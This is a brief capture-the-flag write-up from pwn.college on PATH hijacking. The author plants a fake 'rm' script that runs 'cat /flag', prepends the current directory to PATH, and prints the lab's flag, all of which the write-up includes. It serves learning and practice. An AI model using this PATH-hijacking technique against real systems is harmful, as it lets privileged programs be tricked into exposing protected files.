# Pondering PATH

## Hijacking Commands
You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** `pwn.college{8T8J5mw-evQ5qFOky-6U_5rzD4I.QX3cjM1wiNwIzNzEzW}`

Typed ```echo $PATH``` and saw a list of directories and one by one checked if it had cat inside using ```ls``` and found it in ```/usr/bin```. I added a ```rm``` file with the text ```/usr/bin/cat /flag```. Next, I added it to the path using ```PATH="$PWD:$PATH"``` and got the flag.

```bash
echo $PATH
nano rm
/usr/bin/cat /flag 
chmod +x rm
PATH="$PWD:$PATH"
/challenge/run
pwn.college{8T8J5mw-evQ5qFOky-6U_5rzD4I.QX3cjM1wiNwIzNzEzW}
```

### New Learnings
Learnt about hijacking commands.
